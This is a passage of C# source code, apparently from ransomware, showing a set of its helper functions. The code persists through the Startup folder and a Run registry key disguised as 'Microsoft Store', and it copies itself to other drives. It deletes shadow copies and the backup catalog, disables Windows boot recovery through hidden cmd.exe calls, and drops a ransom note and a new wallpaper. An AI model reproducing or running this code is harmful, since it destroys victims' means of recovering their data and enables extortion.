			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
